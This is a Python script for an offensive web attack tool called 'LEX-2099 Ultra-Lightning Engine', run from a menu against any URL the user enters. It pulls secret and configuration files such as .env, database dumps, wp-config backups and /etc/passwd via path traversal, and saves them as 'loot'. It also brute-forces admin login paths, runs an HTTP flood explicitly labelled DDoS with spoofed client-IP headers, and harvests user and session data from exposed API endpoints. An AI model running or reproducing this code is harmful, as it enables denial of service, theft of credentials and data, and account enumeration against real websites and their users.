import asyncio
import aiohttp
import sys
import time
import random
import os
import json
from colorama import init, Fore, Style

init(autoreset=True)

class UltraLightningEngine:
    def __init__(self):
        # المسار المعتمد لحفظ الملفات المسحوبة
        self.target_dir = r"C:/Users/mohamed/Desktop/src"
        if not os.path.exists(self.target_dir):
            try:
                os.makedirs(self.target_dir, exist_ok=True)
            except:
                pass

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"
        ]

    def display_banner(self):
        print(f"{Fore.MAGENTA}{Style.BRIGHT}")
        print(r"""
    __  __ _       _              _   _             
   / / / /| |     (_)            | | (_)            
  / / / / | |      _  __ _ _ __  | |_ _ _ __   __ _ 
 | | | |  | |     | |/ _` | '_ \ | __| | '_ \ / _` |
 | |_| |  | |____ | | (_| | | | || |_| | | | | (_| |
  \___/   \_____/ |_|\__, |_| |_| \__|_|_| |_|\__, |
                      __/ |                    __/ |
                     |___/                    |___/ 
        [ LEX-2099 ULTRA-LIGHTNING ENGINE v201.0 ]
        """)
        print(f"================================================================={Style.RESET_ALL}")
        print(f"{Fore.CYAN} [1] Lightning File Exfiltration (Instant Loot Scanner){Style.RESET_ALL}")
        print(f"{Fore.CYAN} [2] Ultra Admin Panel Finder (High-Speed Recon){Style.RESET_ALL}")
        print(f"{Fore.CYAN} [3] Hyper-Velocity DDoS / Maximum Stress Test{Style.RESET_ALL}")
        print(f"{Fore.CYAN} [4] User Sessions & Accounts Harvester{Style.RESET_ALL}")
        print(f"================================================================={Style.RESET_ALL}")

    def get_random_headers(self):
        fake_ip = f"{random.randint(11, 190)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        return {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": fake_ip,
            "X-Client-IP": fake_ip,
            "Client-IP": fake_ip,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "keep-alive"
        }

    # Option 1: Lightning File Exfiltration (Saved to exact path)
    async def option_file_exfiltration(self):
        target = input(f"{Fore.YELLOW}[?] Enter Target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
        if not target.startswith("http"):
            target = "https://" + target
            
        print(f"\n{Fore.GREEN}[*] Launching Lightning File Exfiltration on: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Loot will be saved directly to: {self.target_dir}{Style.RESET_ALL}")
        
        connector = aiohttp.TCPConnector(limit_per_host=200, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            assets = [
                "robots.txt", "sitemap.xml", ".env", ".git/HEAD", 
                "config.json", "database.sql", "backup.zip", "wp-config.php.bak",
                "package.json", "composer.json", ".htaccess", "phpinfo.php",
                "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"
            ]
            
            sem = asyncio.Semaphore(50)
            async def check_asset(asset):
                async with sem:
                    url = f"{target.rstrip('/')}/{asset}"
                    try:
                        async with session.get(url, headers=self.get_random_headers(), timeout=4) as r:
                            if r.status == 200:
                                content = await r.text()
                                ct = r.headers.get("Content-Type", "")
                                if "text/html" in ct and asset not in ["robots.txt", "sitemap.xml", "phpinfo.php"]:
                                    return
                                print(f"    {Fore.RED}[!] EXFILTRATED: /{asset}{Style.RESET_ALL}")
                                
                                safe_name = asset.replace('/', '_').replace('\\', '_').replace('.', '_') + "_loot.txt"
                                full_path = os.path.join(self.target_dir, safe_name)
                                
                                with open(full_path, "w", encoding="utf-8", errors="ignore") as f:
                                    f.write(content)
                                print(f"        {Fore.CYAN}--> Saved to path: {full_path}{Style.RESET_ALL}")
                    except:
                        pass

            await asyncio.gather(*(check_asset(a) for a in assets))
        print(f"\n{Fore.GREEN}[*] Exfiltration Completed Instantly.{Style.RESET_ALL}")

    # Option 2: Ultra Admin Panel Finder
    async def option_admin_recon(self):
        target = input(f"{Fore.YELLOW}[?] Enter Target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
        if not target.startswith("http"):
            target = "https://" + target
            
        print(f"\n{Fore.GREEN}[*] High-Speed Admin Panel Hunting on: {target}{Style.RESET_ALL}")
        connector = aiohttp.TCPConnector(limit_per_host=200, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            admin_paths = [
                "admin", "administrator", "wp-login.php", "wp-admin", 
                "login", "user/login", "dashboard", "controlpanel", "panel", "auth",
                "admin/login.php", "administrator/index.php", "site/admin", "cp", "manager"
            ]
            
            sem = asyncio.Semaphore(50)
            async def check_admin(path):
                async with sem:
                    url = f"{target.rstrip('/')}/{path}"
                    try:
                        async with session.get(url, headers=self.get_random_headers(), timeout=4) as resp:
                            if resp.status < 400:
                                print(f"    {Fore.RED}[!] ACTIVE ADMIN PORTAL: /{path} (HTTP {resp.status}){Style.RESET_ALL}")
                    except:
                        pass

            await asyncio.gather(*(check_admin(p) for p in admin_paths))
        print(f"\n{Fore.GREEN}[*] Admin Recon Completed.{Style.RESET_ALL}")

    # Option 3: Hyper-Velocity DDoS
    async def option_stress_test(self):
        target = input(f"{Fore.YELLOW}[?] Enter Target URL for Hyper-DDoS: {Style.RESET_ALL}").strip()
        if not target.startswith("http"):
            target = "https://" + target
            
        try:
            total_requests = int(input(f"{Fore.YELLOW}[?] Enter total attack requests (e.g., 20000): {Style.RESET_ALL}").strip())
            concurrency = int(input(f"{Fore.YELLOW}[?] Enter concurrency pool (e.g., 300): {Style.RESET_ALL}").strip())
        except ValueError:
            print(f"{Fore.RED}[!] Invalid numbers. Aborting.{Style.RESET_ALL}")
            return

        print(f"\n{Fore.RED}[!] LAUNCHING HYPER-VELOCITY LIGHTNING DDoS ENGINE{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target} | Requests: {total_requests} | Concurrency: {concurrency}{Style.RESET_ALL}\n")

        sem = asyncio.Semaphore(concurrency)
        success = 0
        blocked = 0

        async def fire_packet(req_id):
            nonlocal success, blocked
            async with sem:
                try:
                    headers = self.get_random_headers()
                    flood_url = f"{target}?lightning_bust={random.randint(1000000, 9999999)}"
                    async with session.get(flood_url, headers=headers, timeout=3) as resp:
                        if resp.status < 500:
                            success += 1
                        else:
                            blocked += 1
                        print(f"    {Fore.GREEN}[Strike #{req_id}] Status: {resp.status} | IP: {headers['X-Forwarded-For']}{Style.RESET_ALL}", end="\r")
                except:
                    blocked += 1

        connector = aiohttp.TCPConnector(limit_per_host=concurrency, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = time.time()
            tasks = [fire_packet(i+1) for i in range(total_requests)]
            await asyncio.gather(*tasks)
            duration = time.time() - start_time

        print(f"\n\n{Fore.MAGENTA}=================================================================")
        print(f" [★] LIGHTNING STRESS TEST FINISHED.")
        print(f" [★] Total Time: {duration:.2f} seconds")
        print(f" [★] Successful Hits: {success}")
        print(f" [★] Blocked/Dropped Hits: {blocked}")
        print(f"================================================================={Style.RESET_ALL}")

    # Option 4: Accounts & Sessions Harvester (Saved to exact path)
    async def option_account_harvesting(self):
        target = input(f"{Fore.YELLOW}[?] Enter Target URL (e.g., https://example.com): {Style.RESET_ALL}").strip()
        if not target.startswith("http"):
            target = "https://" + target
            
        print(f"\n{Fore.GREEN}[*] Harvesting User Sessions & Accounts on: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Loot will be saved directly to: {self.target_dir}{Style.RESET_ALL}")
        
        connector = aiohttp.TCPConnector(limit_per_host=200, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            auth_paths = [
                "wp-json/wp/v2/users", "wp-json/wp/v2/comments",
                "api/auth/session", "api/users", "profile", "account",
                "login", "user/sessions", "api/v1/users", "graphql"
            ]
            
            sem = asyncio.Semaphore(50)
            async def check_account(path):
                async with sem:
                    url = f"{target.rstrip('/')}/{path}"
                    try:
                        async with session.get(url, headers=self.get_random_headers(), timeout=4) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                print(f"    {Fore.RED}[!] EXPOSED ACCOUNT ENDPOINT: /{path} (HTTP 200){Style.RESET_ALL}")
                                
                                safe_name = path.replace('/', '_') + "_account_loot.json"
                                full_path = os.path.join(self.target_dir, safe_name)
                                
                                with open(full_path, "w", encoding="utf-8", errors="ignore") as f:
                                    f.write(content)
                                print(f"        {Fore.CYAN}--> Saved to path: {full_path}{Style.RESET_ALL}")
                    except:
                        pass

            await asyncio.gather(*(check_account(p) for p in auth_paths))
        print(f"\n{Fore.GREEN}[*] Account Harvesting Completed.{Style.RESET_ALL}")

    async def main_loop(self):
        self.display_banner()
        choice = input(f"{Fore.YELLOW}[?] Select Option [1 to 4]: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            await self.option_file_exfiltration()
        elif choice == "2":
            await self.option_admin_recon()
        elif choice == "3":
            await self.option_stress_test()
        elif choice == "4":
            await self.option_account_harvesting()
        else:
            print(f"{Fore.RED}[!] Invalid choice. Terminating.{Style.RESET_ALL}")

def main():
    engine = UltraLightningEngine()
    asyncio.run(engine.main_loop())

if __name__ == "__main__":
    main()